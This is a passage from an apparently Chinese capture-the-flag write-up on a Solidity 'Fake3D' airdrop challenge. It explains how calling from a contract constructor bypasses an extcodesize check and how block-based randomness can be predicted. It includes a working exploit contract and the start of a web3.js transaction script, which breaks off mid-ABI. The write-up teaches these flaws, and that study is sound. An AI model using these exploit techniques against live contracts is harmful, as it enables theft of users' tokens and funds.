class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Multiplies two numbers, reverts on overflow.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mul</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span></span><br><span class="line">    <span class="hljs-comment">// benefit is lost if 'b' is also tested.</span></span><br><span class="line">    <span class="hljs-comment">// See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    <span class="hljs-built_in">require</span>(c / a == b);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">div</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">require</span>(b &gt; <span class="hljs-number">0</span>); <span class="hljs-comment">// Solidity only automatically asserts when dividing by 0</span></span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    <span class="hljs-comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sub</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">require</span>(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Adds two numbers, reverts on overflow.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    <span class="hljs-built_in">require</span>(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span></span><br><span class="line"><span class="hljs-comment">  * reverts when dividing by zero.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mod</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">require</span>(b != <span class="hljs-number">0</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WinnerList&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    struct Richman&#123;</span><br><span class="line">        address who;</span><br><span class="line">        uint balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">note</span>(<span class="hljs-params">address _addr, uint _value</span>) <span class="hljs-title">public</span></span>&#123;</span><br><span class="line">        Richman rm;</span><br><span class="line">        rm.who = _addr;</span><br><span class="line">        rm.balance = _value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Fake3D &#123;</span><br><span class="line">    using SafeMath <span class="hljs-keyword">for</span> *;</span><br><span class="line">mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256)  public balance;</span><br><span class="line">uint public totalSupply  = <span class="hljs-number">10</span>**<span class="hljs-number">18</span>;</span><br><span class="line">WinnerList wlist;</span><br><span class="line"></span><br><span class="line">event FLAG(string b64email, string slogan);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">constructor</span>(address _addr) public&#123;</span><br><span class="line">    wlist = WinnerList(_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">modifier turingTest() &#123;</span><br><span class="line">        address _addr = msg.sender;</span><br><span class="line">        uint256 _codeLength;</span><br><span class="line">        assembly &#123;<span class="hljs-attr">_codeLength</span> := extcodesize(_addr)&#125;</span><br><span class="line">        <span class="hljs-built_in">require</span>(_codeLength == <span class="hljs-number">0</span>, <span class="hljs-string">"sorry humans only"</span>);</span><br><span class="line">        _;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params">address _to, uint256 _amount</span>) <span class="hljs-title">public</span></span>&#123;</span><br><span class="line">        <span class="hljs-built_in">require</span>(balance[msg.sender] &gt;= _amount);</span><br><span class="line">        balance[msg.sender] = balance[msg.sender].sub(_amount);</span><br><span class="line">        balance[_to] = balance[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">airDrop</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">turingTest</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>&#123;</span><br><span class="line">uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">            (block.timestamp).add</span><br><span class="line">            (block.difficulty).add</span><br><span class="line">            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">            (block.gaslimit).add</span><br><span class="line">            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add</span><br><span class="line">            (block.number)</span><br><span class="line">        )));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span>((seed - ((seed / <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>)) &lt; <span class="hljs-number">288</span>)&#123;</span><br><span class="line">            balance[tx.origin] = balance[tx.origin].add(<span class="hljs-number">10</span>);</span><br><span class="line">totalSupply = totalSupply.sub(<span class="hljs-number">10</span>);</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CaptureTheFlag</span>(<span class="hljs-params">string b64email</span>) <span class="hljs-title">public</span></span>&#123;</span><br><span class="line"><span class="hljs-built_in">require</span> (balance[msg.sender] &gt; <span class="hljs-number">8888</span>);</span><br><span class="line">wlist.note(msg.sender,balance[msg.sender]);</span><br><span class="line">emit FLAG(b64email, <span class="hljs-string">"Congratulations to capture the flag?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以看到我们的目的就是绕过<code>turingTest</code>，<code>modifier</code>声明的作用有点类似于Python中的修饰函数。它跟<code>_</code>结合起来可以实现：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">temp</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        address _addr = msg.sender;</span><br><span class="line">        uint256 _codeLength;</span><br><span class="line">        assembly &#123;<span class="hljs-attr">_codeLength</span> := extcodesize(_addr)&#125;</span><br><span class="line">        <span class="hljs-built_in">require</span>(_codeLength == <span class="hljs-number">0</span>, <span class="hljs-string">"sorry humans only"</span>);</span><br><span class="line">        <span class="hljs-comment">// _ 是替换位置的标志</span></span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">            (block.timestamp).add</span><br><span class="line">            (block.difficulty).add</span><br><span class="line">            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">            (block.gaslimit).add</span><br><span class="line">            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add</span><br><span class="line">            (block.number)</span><br><span class="line">        )));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span>((seed - ((seed / <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>)) &lt; <span class="hljs-number">288</span>)&#123;</span><br><span class="line">            balance[tx.origin] = balance[tx.origin].add(<span class="hljs-number">10</span>);</span><br><span class="line">totalSupply = totalSupply.sub(<span class="hljs-number">10</span>);</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;那么关键就是绕过<code>require(_codeLength == 0, &quot;sorry humans only&quot;);</code>，根本就是<code>bypass extcodesize</code>。</p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>&emsp;&emsp;extcodesize的作用是return size of the code at address，经常拿来判别<code>直接</code>调用者是另一个合约还是用户，因为一个合约的code size不会是0，而用户是0.</p><p>&emsp;&emsp;但问题就出来当合约正在执行<code>构造函数constructor</code>并部署时，其extcodesize为<code>0</code>，也就是说合约完全可以通过在constructor中调用方法而<code>绕过</code>该判断。所以我们只要通过不断部署合约来进行攻击就可以拿到flag。</p><p>&emsp;&emsp;有了上篇的基础后，这里的exp也比较好写和理解，如下：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;</span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Adds two numbers, reverts on overflow.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    <span class="hljs-built_in">require</span>(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Fake3D &#123;</span><br><span class="line">    mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256)  public balance;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">airDrop</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>);</span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-title">function</span> <span class="hljs-title">CaptureTheFlag</span>(<span class="hljs-params">string b64email</span>);</span></span><br><span class="line"><span class="hljs-function">&#125;</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">contract</span> <span class="hljs-title">PWNFake</span> </span>&#123;</span><br><span class="line">    using SafeMath <span class="hljs-keyword">for</span> *;</span><br><span class="line">    uint public test_count = <span class="hljs-number">0</span>;</span><br><span class="line">    uint public goto_count = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">constructor</span>() public payable &#123;</span><br><span class="line">        Fake3D mime = Fake3D(<span class="hljs-number">0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a</span>);</span><br><span class="line">        </span><br><span class="line">        uint16 i;</span><br><span class="line">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">900</span>; i++) &#123;</span><br><span class="line">            test_count++;</span><br><span class="line">            uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">                (block.timestamp).add</span><br><span class="line">                (block.difficulty).add</span><br><span class="line">                ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">                (block.gaslimit).add</span><br><span class="line">                ((uint256(keccak256(abi.encodePacked(<span class="hljs-keyword">this</span>)))) / (now)).add</span><br><span class="line">                (block.number)</span><br><span class="line">            )));</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span>((seed - ((seed / <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>)) &lt; <span class="hljs-number">288</span>)&#123;</span><br><span class="line">                goto_count++;</span><br><span class="line">                mime.airDrop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_goal</span>(<span class="hljs-params"></span>) <span class="hljs-title">view</span> <span class="hljs-title">public</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">                (block.timestamp).add</span><br><span class="line">                (block.difficulty).add</span><br><span class="line">                ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">                (block.gaslimit).add</span><br><span class="line">                ((uint256(keccak256(abi.encodePacked(<span class="hljs-keyword">this</span>)))) / (now)).add</span><br><span class="line">                (block.number)</span><br><span class="line">        )));</span><br><span class="line">        </span><br><span class="line">        uint256 result = (seed - ((seed / <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>));</span><br><span class="line">        <span class="hljs-keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getbalance</span>(<span class="hljs-params"></span>) <span class="hljs-title">view</span> <span class="hljs-title">public</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        Fake3D mime2 = Fake3D(<span class="hljs-number">0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a</span>);</span><br><span class="line">        <span class="hljs-keyword">return</span> mime2.balance(<span class="hljs-keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        Fake3D mime2 = Fake3D(<span class="hljs-number">0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a</span>);</span><br><span class="line">        mime2.CaptureTheFlag(<span class="hljs-string">"amF5ODBAcHJvdG9ubWFpbC5jb20="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">error_test</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        Fake3D mime = Fake3D(<span class="hljs-number">0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a</span>);</span><br><span class="line">        mime.airDrop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里的<code>error_test</code>是为了验证上面的漏洞，不是在构造函数constructor中调用是过不了<code>extcodesize</code>的判断的。</p><p>&emsp;&emsp;需要<code>注意</code>的地方就是原合约中使用<code>msg.sender</code>代入计算，而msg.sender是合约的直接调用者，这里就是我们<code>自己的攻击合约</code>的地址，所以我在exp中使用了<code>this</code>来代替，this在合约中表示合约本身的地址。</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">    (block.timestamp).add</span><br><span class="line">    (block.difficulty).add</span><br><span class="line">    ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">    (block.gaslimit).add</span><br><span class="line">    ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add</span><br><span class="line">    (block.number)</span><br><span class="line">)));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;另一个点就是这里是检测<code>msg.sender</code>的账户是否大于8888，而不是tx.origin。但赌中是给<code>tx.origin</code>发奖金的。所以我们还需要用<code>tx.origin</code>的用户去做调用<code>CaptureTheFlag(string b64email)</code>。这一步可以用web3js，也可以用<code>metamask</code>，用metamask的时候需要在data段里填<code>CaptureTheFlag(string b64email)</code>的<code>abi</code>。用web3js实现是：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"web3"</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> Tx = <span class="hljs-built_in">require</span>(<span class="hljs-string">'ethereumjs-tx'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> BigNumber = <span class="hljs-built_in">require</span>(<span class="hljs-string">'bignumber.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> privKey = <span class="hljs-keyword">new</span> Buffer.from(<span class="hljs-string">'6c33....'</span>, <span class="hljs-string">'hex'</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> fromAddress = <span class="hljs-string">"0x527e6be04ec5a81fd3ef871694230edd432f010b"</span>;</span><br><span class="line"><span class="hljs-comment">// 合约地址</span></span><br><span class="line"><span class="hljs-keyword">let</span> contractAddress = <span class="hljs-string">"0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a"</span>;</span><br><span class="line"><span class="hljs-comment">// 创建web3对象</span></span><br><span class="line"><span class="hljs-keyword">let</span> web3 = <span class="hljs-keyword">new</span> Web3();</span><br><span class="line"><span class="hljs-comment">// 连接到 ropsten 测试节点</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> INFURA_API_KEY = <span class="hljs-string">"9762c5d28b..."</span></span><br><span class="line"><span class="hljs-keyword">let</span> ROPSTEN_URL = <span class="hljs-string">"https://ropsten.infura.io/"</span> + INFURA_API_KEY</span><br><span class="line">web3.setProvider(<span class="hljs-keyword">new</span> Web3.providers.HttpProvider(ROPSTEN_URL))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> abi = [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [],</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"totalSupply"</span>,</span><br><span class="line"><span class="hljs-string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"b64email"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"CaptureTheFlag"</span>,</span><br><span class="line"><span class="hljs-string">"outputs"</span>: [],</span><br><span class="line"><span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"_to"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"address"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"_amount"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"transfer"</span>,</span><br><span class="line"><span class="hljs-string">"outputs"</span>: [],</span><br><span class="line"><span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [],</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"airDrop"</span>,</span><br><span class="line"><span class="hljs-string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"bool"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"constant"</span>: 